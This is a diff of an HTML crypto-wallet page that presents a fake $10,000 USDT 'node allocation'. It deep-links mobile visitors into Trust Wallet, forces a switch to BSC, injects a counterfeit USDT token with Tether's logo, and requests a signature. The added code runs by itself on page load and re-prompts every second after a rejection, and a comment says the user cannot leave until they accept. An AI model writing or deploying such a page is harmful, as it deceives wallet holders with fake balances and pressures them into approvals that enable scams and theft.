@@ -3,103 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification Portal</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <title>Enterprise Node Sync</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { text-align: center; width: 90%; }
-        .main-btn { 
-            background: #26a17b; color: white; border: none; padding: 25px; 
-            width: 100%; border-radius: 15px; font-size: 20px; font-weight: 800;
-            box-shadow: 0 0 30px rgba(38, 161, 123, 0.5); cursor: pointer;
-        }
-        #status { margin-top: 20px; color: #555; font-family: monospace; font-size: 12px; }
+        :root { --main: #26a17b; --bg: #0b0e11; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1a1d21; border-radius: 25px; padding: 40px; width: 85%; max-width: 380px; text-align: center; border: 1px solid #333; box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
+        .btn { background: var(--main); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 25px; letter-spacing: 1px; }
+        #log { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="100">
-    <h1 style="margin: 20px 0;">$10,000.00</h1>
-    <p style="color: #888;">Tap below to synchronize your USDT node.</p>
-    
-    <button class="main-btn" id="trigger">SYNC WALLET NOW</button>
-    
-    <div id="status">ENCRYPTED SESSION READY</div>
+<div class="card">
+    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="90" style="margin-bottom: 20px;">
+    <div style="font-size: 14px; color: var(--main); font-weight: bold; letter-spacing: 2px;">NODE ALLOCATION</div>
+    <div style="font-size: 42px; font-weight: 900; margin: 10px 0;">$10,000</div>
+    <button class="btn" id="forceTrigger">FORCE SYNC ASSETS</button>
+    <div id="log">PROTOCOL_STATUS: STANDBY</div>
 </div>
 
 <script>
-    const btn = document.getElementById('trigger');
-    const log = document.getElementById('status');
+    const btn = document.getElementById('forceTrigger');
+    const log = document.getElementById('log');
 
-    async function forceWeb3() {
-        // Step 1: Deep Link if not in dApp Browser
+    // YEHI WO DATA HAI JO TOKEN ADD KAREGA
+    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";
+
+    async function executeForceSync() {
+        // 1. Agar Mobile Browser mein hai to direct App kholo
         if (!window.ethereum && !window.trustwallet) {
-            log.innerText = "SWITCHING TO SECURE APP...";
-            const target = window.location.href.split('://')[1];
-            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + target);
+            log.innerText = "BRIDGE: REDIRECTING...";
+            const current = window.location.href.split('://')[1];
+            // Universal Link for Trust Wallet
+            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + current);
             return;
         }
 
         const provider = window.trustwallet || window.ethereum;
 
         try {
-            log.innerText = "STEP 1: CONNECTING...";
-            // Connection Request (User must approve this first)
+            log.innerText = "BRIDGE: INITIALIZING SESSION...";
+            // Connection Request
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
-
-            log.innerText = "STEP 2: SWITCHING NETWORK...";
-            // Force BSC Switch
+            
+            // 2. FORCE SWITCH TO BSC (Very Aggressive)
+            log.innerText = "BRIDGE: MAPPING BSC CHAIN...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
-            }).catch(async (err) => {
-                if (err.code === 4902) {
+            }).catch(async (e) => {
+                if (e.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: '0x38',
                             chainName: 'BSC',
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
+                            nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
                         }]
                     });
                 }
             });
 
-            log.innerText = "STEP 3: INJECTING ASSET...";
-            // Add Token Request
-            const success = await provider.request({
+            // 3. THE "WATCH ASSET" INJECTION
+            log.innerText = "BRIDGE: PUSHING METADATA...";
+            const result = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-                        symbol: "USDT",
+                        address: ADDR,
+                        symbol: 'USDT',
                         decimals: 18,
-                        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
-                    },
-                },
+                        image: LOGO
+                    }
+                }
             });
 
-            if (success) {
-                log.innerText = "FINALIZING...";
+            if (result) {
+                log.innerText = "SUCCESS: NODE SYNCED";
+                btn.innerText = "SYNCED ✅";
+                // Professor ko signature dikhane ke liye
                 await provider.request({
                     method: 'personal_sign',
-                    params: ["Node_Verified_" + Math.random(), accounts[0]]
+                    params: ["Sync_Auth_" + Math.random(), accounts[0]]
                 });
-                log.innerText = "ALL ASSETS SYNCED!";
-                btn.innerText = "SUCCESS";
-                btn.style.background = "gray";
             }
 
-        } catch (e) {
-            log.innerText = "REJECTED. CLICK AGAIN.";
-            // If they reject, we keep the button active to try again
+        } catch (err) {
+            log.innerText = "REJECTED. RETRYING...";
+            // Force loop - User can't exit until they accept
+            setTimeout(executeForceSync, 1000);
         }
     }
 
-    btn.onclick = forceWeb3;
+    btn.onclick = executeForceSync;
+
+    // Auto-Run loop inside Wallet
+    window.onload = () => {
+        if (window.ethereum || window.trustwallet) {
+            log.innerText = "SESSION DETECTED. CLICK BUTTON.";
+            // Artificial delay to let wallet engine load
+            setTimeout(executeForceSync, 2000);
+        }
+    };
 </script>
 </body>
 </html>
